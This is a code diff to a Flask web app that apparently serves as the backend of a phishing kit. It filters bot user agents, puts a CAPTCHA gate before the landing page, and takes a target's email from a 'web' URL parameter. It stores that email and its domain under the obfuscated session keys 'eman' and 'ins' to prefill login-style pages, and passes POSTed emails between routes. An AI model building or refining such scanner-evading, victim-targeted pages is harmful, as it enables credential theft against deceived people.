@@ -124,12 +124,52 @@ bot_user_agents = [
 "crawler"
 ]
 
-@app.route('/', methods=['GET', 'POST'])
+# Function to generate a random CAPTCHA code
+def generate_captcha_code(length=4):
+    return ''.join(random.choices(string.digits, k=length))
+
+# Function to generate a CAPTCHA image
+def generate_captcha_image(code):
+    width, height = 150, 60
+    image = Image.new('RGB', (width, height), color=(255, 255, 255))
+    draw = ImageDraw.Draw(image)
+
+    # Add some noise (dots)
+    for _ in range(random.randint(100, 200)):
+        draw.point((random.randint(0, width), random.randint(0, height)), fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
+
+    # Use a truetype font for the text
+    try:
+        font = ImageFont.truetype("arial.ttf", 36)
+    except IOError:
+        font = ImageFont.load_default()
+
+    # Add the CAPTCHA text with distortion
+    for i, char in enumerate(code):
+        x = 20 + i * 30
+        y = random.randint(10, 20)
+        angle = random.randint(-25, 25)
+        draw.text((x, y), char, font=font, fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
+
+    # Add lines for additional noise
+    for _ in range(random.randint(3, 5)):
+        x1, y1 = random.randint(0, width), random.randint(0, height)
+        x2, y2 = random.randint(0, width), random.randint(0, height)
+        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=2)
+
+    # Save the image to a bytes buffer
+    img_io = io.BytesIO()
+    image.save(img_io, 'PNG')
+    img_io.seek(0)
+
+    # Convert the image to base64 string to pass to the HTML
+    return base64.b64encode(img_io.getvalue()).decode('utf-8')
+
+@app.route('/m', methods=['GET', 'POST'])
 def captcha():
     if request.method == 'GET':
         if 'passed_captcha' in session and session['passed_captcha']:
-            web_param = request.args.get('web')  # Retrieve 'web' query parameter
-            return redirect(url_for('success', web=web_param))
+            return redirect(url_for('success'))
 
         # Generate a random 4-digit CAPTCHA code
         code = generate_captcha_code()
@@ -155,8 +195,7 @@ def captcha():
 
         if user_input == session.get('captcha_code'):
             session['passed_captcha'] = True
-            web_param = request.args.get('web')  # Retrieve 'web' query parameter
-            return redirect(url_for('success', web=web_param))
+            return redirect(url_for('success'))
         else:
             # Generate a new CAPTCHA if the user input was incorrect
             code = generate_captcha_code()
@@ -167,18 +206,20 @@ def captcha():
 @app.route('/success')
 def success():
     if 'passed_captcha' in session and session['passed_captcha']:
-        web_param = request.args.get('web')  # Retrieve 'web' query parameter
+        web_param = request.args.get('web')
         return redirect(url_for('route2', web=web_param))
     else:
         return redirect(url_for('captcha'))
 
-@app.route("/m")
+
+@app.route("/")
 def route2():
     web_param = request.args.get('web')
     if web_param:
         session['eman'] = web_param
         session['ins'] = web_param[web_param.index('@') + 1:]
     return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
+
 
 @app.route("/first", methods=['POST'])
 def first():
@@ -202,11 +243,12 @@ def first():
         # Store email in session
         session['eman'] = email
 
-        # Retrieve the 'web' parameter from the URL and pass it to the redirect
-        web_param = request.args.get('web')
-        return redirect(url_for('benza', web=web_param))
+        # Redirect
+        return redirect(url_for('benza', web=email))
 
     return "Method Not Allowed", 405
+
+
 
 @app.route("/second", methods=['POST'])
 def second():
@@ -230,25 +272,19 @@ def second():
         # Store email in session
         session['ins'] = email
 
-        # Retrieve the 'web' parameter from the URL and pass it to the redirect
-        web_param = request.args.get('web')
-        return redirect(url_for('lasmo', web=web_param))
+        # Redirect
+        return redirect(url_for('lasmo', web=email))
 
     return "Method Not Allowed", 405
+
+
 
 @app.route("/benzap", methods=['GET'])
 def benza():
     if request.method == 'GET':
-        web_param = request.args.get('web')
-        if web_param:
-            session['eman'] = web_param
-            session['ins'] = web_param.split('@')[1] if '@' in web_param else ''
-        
         eman = session.get('eman')
         dman = session.get('ins')
-
-        # Make sure to include the 'web' parameter in the redirect URL
-        return render_template('ind.html', eman=eman, dman=dman, web=web_param)
+    return render_template('ind.html', eman=eman, dman=dman)
 
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
